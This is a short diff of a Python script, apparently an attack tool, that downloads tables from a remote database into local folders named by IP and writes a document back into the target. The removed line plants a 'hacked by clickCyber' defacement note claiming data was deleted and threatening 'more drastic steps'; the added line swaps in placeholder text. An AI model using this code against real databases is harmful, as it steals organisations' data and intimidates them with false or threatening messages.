@@ -12,9 +12,9 @@ def downloadDB(url: str, tables: list) -> str:
 		open(f'list/{ip}/{table}', 'w').write(str(response.json()))
 	headers = {'Content-type': 'application/json',}
 	params = (('pretty', ''),)
-	response = requests.put(url=f'{url}/read_me/dag4x/972',
+	response = requests.put(url=f'{url}/readdd2',
 	 headers=headers, 
-	 params=params, data='{"hacked by":"clickCyber", "message":"Your organization\'s database has crashed in our cyber crawler. All information is deleted from the company\'s servers to protect users\' privacy. Please fix the loophole next time we take more drastic steps Gesh 4S Israel Group"}')
+	 params=params, data='{"ddd":"sss", "message":"sss"}')
 
 
 def getTables(url: str):
